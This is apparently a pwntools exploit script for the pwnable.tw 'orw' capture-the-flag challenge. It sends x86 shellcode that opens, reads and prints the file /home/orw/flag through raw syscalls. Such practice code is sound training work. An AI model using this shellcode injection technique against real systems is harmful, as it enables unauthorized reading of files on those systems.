#!/usr/bin/python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./Downloads/orw')

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10001)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break main
'''.format(**locals())

shellcode = asm('''
        push 0x00006761
        push 0x6c662f77
        push 0x726f2f65
        push 0x6d6f682f
        
        mov eax,5
        lea ebx,[esp]
        mov ecx,4
        int 0x80
        
        mov ebx,eax
        lea ecx,[esp]
        mov eax,3
        int 0x80
        
        mov eax,4
        mov ebx,1
        mov edx,50
        int 0x80
''')

io = start()
pause()
io.recv()
io.send(shellcode)
io.interactive()

